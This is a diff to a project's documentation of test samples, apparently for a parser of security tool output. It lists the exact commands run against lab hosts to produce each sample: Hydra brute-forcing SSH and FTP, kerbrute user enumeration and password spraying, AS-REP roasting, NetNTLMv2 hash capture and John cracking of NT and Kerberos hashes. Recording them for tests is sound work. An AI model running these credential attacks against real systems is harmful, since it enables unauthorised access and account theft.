@@ -89,3 +89,20 @@ Real tool output published under an open licence, kept in `tests/samples/` so th
 | `nuclei-ms.txt` | `nuclei -duc -ni -ud /opt/nuclei-templates -t …/ssl -t …/network -rl 50 -l nuclei-targets.txt -silent -ms -ts -o nuclei-ms.txt` |
 | `nuclei-names.jsonl` | `nuclei -duc -ni -ud /opt/nuclei-templates -t …/ssl -t …/network -t …/javascript -t …/http/technologies -t …/http/misconfiguration -rl 50 -l nuclei-names.txt -silent -j -or -o nuclei-names.jsonl`; the targets are the three `lab-*.lab.test` names |
 | `nuclei-screen.txt` | `nuclei -duc -ni -ud /opt/nuclei-templates -t …/ssl -t …/network -t …/javascript -t …/http/technologies -t …/http/misconfiguration -rl 50 -l nuclei-targets.txt -nc`, screen and errors saved (`> … 2>&1`) |
+
+`samples/lab-creds/` is one run of `tests/lab/capture.sh creds` (Hydra v9.8dev `707c822`, kerbrute `9cfb81e` and v1.0.3, impacket `75938fc`, John 1.9.0-jumbo-1+bleeding `37bebbe`) against lab-web and the Samba domain controller lab-dc (`arbor.lab.test`, 10.99.56.13). Files are as written. `tests/test_lab_creds.py` reads them.
+
+| File | Command (in the creds container) |
+|---|---|
+| `hydra-ssh.txt` | `hydra -L web-users.txt -P web-passwords.txt -t 4 -o hydra-ssh.txt ssh://10.99.56.10` |
+| `hydra-ftp.json` | `hydra -L web-users.txt -P web-passwords.txt -b json -o hydra-ftp.json ftp://10.99.56.10` |
+| `hydra-ftp-console.txt` | `hydra -L web-users.txt -P web-passwords.txt ftp://10.99.56.10 \| tee hydra-ftp-console.txt` |
+| `kerbrute-userenum.txt` | `kerbrute userenum -d arbor.lab.test --dc 10.99.56.13 users.txt \| tee kerbrute-userenum.txt` |
+| `kerbrute-spray.txt` | `kerbrute passwordspray -d arbor.lab.test --dc 10.99.56.13 users.txt Spring-Lab-26 \| tee kerbrute-spray.txt` |
+| `kerbrute-o.txt` | kerbrute v1.0.3 `passwordspray -d arbor.lab.test --dc 10.99.56.13 -o kerbrute-o.txt users.txt Spring-Lab-26` |
+| `getnpusers.txt` | `GetNPUsers.py arbor.lab.test/ -usersfile users.txt -no-pass -dc-ip 10.99.56.13 \| tee getnpusers.txt` |
+| `netntlmv2.txt` | the hash line of `smbserver.py -debug -smb2support share /tmp` while `smbclient //10.99.56.6/share -W ARBOR -U rowan.ash%… -c ls` logs in |
+| `arbor.ntds` | not a tool's output: `dc/lab.py ntds` on lab-dc writes each account in secretsdump's NTDS line format, since secretsdump cannot replicate from Samba |
+| `john-show-nt.txt`, `john-show-left.txt` | `john --pot=john.pot --format=NT --wordlist=wordlist.txt arbor.ntds`, then `john --pot=john.pot --show --format=NT arbor.ntds > john-show-nt.txt`, and `--show=left` |
+| `john-show-krb5asrep.txt` | the same with `--format=krb5asrep getnpusers.txt` |
+| `john-show-netntlmv2.txt` | the same with `--format=netntlmv2 netntlmv2.txt` |
